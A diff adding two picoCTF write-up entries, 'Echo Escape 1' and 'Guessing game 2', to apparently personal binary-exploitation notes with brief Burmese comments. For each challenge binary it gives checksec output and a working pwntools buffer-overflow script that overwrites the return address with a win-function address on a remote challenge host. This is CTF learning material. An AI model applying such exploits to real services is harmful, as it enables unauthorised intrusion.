@@ -291,6 +291,67 @@ void win(void)
 
 
 
+#### Echo Escape 1
+```
+File:     /home/Jackfruit/cate/learn/binary/stack/picoCTF/echo_escape1/vuln
+Arch:     amd64
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+
+```
+
+
+ရိုးရိုး buffer overflow challenge လေးပါဘဲ
+
+```python 
+
+from pwn import *
+r = remote("mysterious-sea.picoctf.net",60382)
+payload = b"A" * 40 + p64(0x0000000000401256)
+
+r.recvuntil(b"Please enter your name: ")
+r.sendline(payload)
+r.interactive()
+
+```
+
+#### Guessing game 2
+
+```
+File:     /home/Jackfruit/cate/learn/binary/stack/picoCTF/echo_escape2/vuln
+Arch:     i386
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x8048000)
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+
+```
+
+တူတူ ဘဲ 32 ဖြစ်သွားတာဘဲ
+
+```python
+from pwn import *
+
+r = remote("dolphin-cove.picoctf.net",62577)
+
+payload = b"A" * 44 + p32(0x08049276)
+
+  
+
+r.recvuntil(b"Enter the secret key: ")
+
+r.sendline(payload)
+
+r.interactive()
+```
 
 
 
